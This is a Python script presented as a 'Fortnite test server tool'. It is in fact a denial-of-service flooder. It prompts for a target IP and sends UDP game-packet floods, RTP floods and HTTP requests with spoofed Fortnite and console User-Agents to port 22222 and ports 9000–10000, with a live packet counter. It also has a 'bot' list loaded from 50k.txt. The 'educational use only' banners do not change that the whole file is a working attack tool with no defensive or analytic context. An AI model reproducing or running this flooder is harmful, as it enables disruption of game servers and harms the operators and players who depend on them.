#!/usr/bin/env python3
# ==================================================
#  KLFH — FORTNITE TEST SERVER TOOL  v3.1
#  Ports: 22222  +  Range: 9000–10000
#  Load from: 50k.txt | Per Bot: 1024 Packets
#  Protocol: UDP + RTP + HTTP
#  FOR EDUCATIONAL TEST SERVERS ONLY ✅
# ==================================================

import socket
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor

# ================== CONFIGURATION ==================
PAYLOAD_SIZE = 1024
PACKETS_PER_BOT = 1024
BOT_FILE = "50k.txt"

# ========== PORTS AS REQUESTED ==========
FIXED_PORT = 22222
PORT_RANGE_START = 9000
PORT_RANGE_END = 10000
# =========================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Fortnite/29.10.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) UnrealEngine/5.3.0",
    "Mozilla/5.0 (PlayStation; PlayStation 5/2.00) Fortnite/29.10.0",
    "Mozilla/5.0 (Nintendo Switch; Fortnite/29.10.0)",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) Fortnite/29.10.0 Mobile",
    "KLFH-TestBot/1.0 (+Educational Use Only)"
]

bots = []
valid_bots = []
stop_flag = False
total_packets_sent = 0
lock = threading.Lock()

def print_banner():
    banner = """
╔══════════════════════════════════════════════════════════╗
║   KLFH — FORTNITE TEST SERVER TOOL  v3.1                  ║
║   Ports: 22222  |  Range: 9000 → 10000                     ║
║   Load from: 50k.txt | Per Bot: 1024 Packets               ║
║   UDP + RTP + HTTP | User-Agent Spoofing                   ║
║   FOR AUTHORIZED TEST ENVIRONMENT ONLY ✅                  ║
╚══════════════════════════════════════════════════════════╝
"""
    print(banner)

def load_bots():
    global bots
    try:
        with open(BOT_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        bots = [line.strip() for line in lines if line.strip() and not line.startswith('#')]
        print(f"[+] Loaded {len(bots)} entries from {BOT_FILE}")
        return True
    except FileNotFoundError:
        print(f"[!] ERROR: File '{BOT_FILE}' not found!")
        print("[!] Create 50k.txt — one IP per line")
        return False

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

def validate_bots():
    global valid_bots
    print("[+] Validating bot IPs...")
    valid_bots = [ip for ip in bots if is_valid_ip(ip)]
    invalid_count = len(bots) - len(valid_bots)
    print(f"[+] Valid bots:   {len(valid_bots)}")
    if invalid_count > 0:
        print(f"[!] Invalid skipped: {invalid_count}")
    return len(valid_bots) > 0

def get_target_ports():
    """Return list of all target ports: fixed + range"""
    ports = [FIXED_PORT]
    ports.extend(range(PORT_RANGE_START, PORT_RANGE_END + 1))
    return ports

def generate_game_packet():
    pkt = bytearray(PAYLOAD_SIZE)
    pkt[0] = 0x82
    pkt[1] = random.randint(0, 255)
    pkt[2] = random.randint(0, 255)
    pkt[3] = random.randint(0, 255)
    pkt[4] = random.randint(0, 255)
    for i in range(5, PAYLOAD_SIZE):
        pkt[i] = random.randint(0, 255)
    return bytes(pkt)

def generate_rtp_packet():
    pkt = bytearray(12 + 200)
    pkt[0] = 0x80
    pkt[1] = 8
    seq = random.randint(1000, 65000)
    pkt[2] = (seq >> 8) & 0xFF
    pkt[3] = seq & 0xFF
    ts = random.randint(100000, 99999999)
    pkt[4] = (ts >> 24) & 0xFF
    pkt[5] = (ts >> 16) & 0xFF
    pkt[6] = (ts >> 8) & 0xFF
    pkt[7] = ts & 0xFF
    ssrc = random.randint(1000000, 99999999)
    pkt[8] = (ssrc >> 24) & 0xFF
    pkt[9] = (ssrc >> 16) & 0xFF
    pkt[10] = (ssrc >> 8) & 0xFF
    pkt[11] = ssrc & 0xFF
    for i in range(12, len(pkt)):
        pkt[i] = random.randint(0, 255)
    return bytes(pkt)

def generate_http_request(target_ip, port):
    ua = random.choice(USER_AGENTS)
    paths = ["/api/v1/game/connect", "/api/v1/auth/login", "/game/status", "/matchmaking/join"]
    path = random.choice(paths)
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {target_ip}:{port}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: */*\r\n"
        f"Connection: Keep-Alive\r\n"
        f"\r\n"
    )
    return req.encode()

def bot_worker(bot_id, target_ip, duration):
    global total_packets_sent, stop_flag
    ports = get_target_ports()
    game_pkt = generate_game_packet()
    rtp_pkt = generate_rtp_packet()
    start_time = time.time()

    while not stop_flag:
        if duration > 0 and time.time() - start_time >= duration:
            break

        for port in ports:
            if stop_flag: break
            if duration > 0 and time.time() - start_time >= duration:
                break

            # UDP Flood — Game packets
            try:
                sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sent = 0
                while sent < PACKETS_PER_BOT and not stop_flag:
                    sock_udp.sendto(game_pkt, (target_ip, port))
                    sent += 1
                    with lock:
                        total_packets_sent += 1
                sock_udp.close()
            except:
                pass

            # RTP Flood — Voice packets
            try:
                sock_rtp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock_rtp.sendto(rtp_pkt, (target_ip, port))
                with lock:
                    total_packets_sent += 1
                sock_rtp.close()
            except:
                pass

            # HTTP — Auth request
            try:
                sock_http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock_http.settimeout(0.5)
                sock_http.connect((target_ip, port))
                sock_http.sendall(generate_http_request(target_ip, port))
                sock_http.close()
                with lock:
                    total_packets_sent += 1
            except:
                pass

def display_stats():
    start = time.time()
    prev = 0
    while not stop_flag:
        time.sleep(1)
        elapsed = int(time.time() - start)
        speed = total_packets_sent - prev
        prev = total_packets_sent
        print(f"\r⚡ Packets: {total_packets_sent:,} | Speed: {speed:,}/s | Bots: {len(valid_bots)} | Elapsed: {elapsed}s", end="", flush=True)

def start_attack(target_ip, duration):
    global stop_flag, total_packets_sent
    stop_flag = False
    total_packets_sent = 0
    ports = get_target_ports()

    print("\n" + "="*65)
    print(f"🚀 ATTACK DEPLOYED")
    print(f"   Target IP   : {target_ip}")
    print(f"   Fixed Port  : {FIXED_PORT}")
    print(f"   Port Range  : {PORT_RANGE_START} – {PORT_RANGE_END}")
    print(f"   Total Ports : {len(ports)}")
    print(f"   Bots Active : {len(valid_bots)}")
    print(f"   Per Bot     : {PACKETS_PER_BOT} packets/port cycle")
    print(f"   Duration    : {'Unlimited (stop with Ctrl+C)' if duration == 0 else f'{duration} seconds'}")
    print("="*65 + "\n")

    stats_thread = threading.Thread(target=display_stats, daemon=True)
    stats_thread.start()

    with ThreadPoolExecutor(max_workers=min(200, len(valid_bots))) as executor:
        for idx, bot_ip in enumerate(valid_bots):
            executor.submit(bot_worker, idx, target_ip, duration)

    print("\n\n✅ Attack finished — Total packets:", f"{total_packets_sent:,}")

def main():
    print_banner()

    if not load_bots():
        return
    if not validate_bots():
        return

    print("\n📋 Port Configuration:")
    print(f"   → Fixed port: {FIXED_PORT}")
    print(f"   → Range:     {PORT_RANGE_START}–{PORT_RANGE_END}")
    print(f"   → Total:     {len(get_target_ports())} ports\n")

    target_ip = input("🎮 Enter Target IP   : ").strip()
    while not target_ip or not is_valid_ip(target_ip):
        print("⚠️ Enter a valid IP address!")
        target_ip = input("🎮 Enter Target IP   : ").strip()

    duration_input = input("⏱️  Enter Time (sec, 0=unlimited): ").strip()
    duration = int(duration_input) if duration_input.isdigit() else 0

    print(f"\n[!] Starting in 3s... Press Ctrl+C to stop")
    try:
        time.sleep(3)
        start_attack(target_ip, duration)
    except KeyboardInterrupt:
        stop_flag = True
        print("\n\n⏹️ Stopped by user — Total packets:", f"{total_packets_sent:,}")

if __name__ == "__main__":
    main()
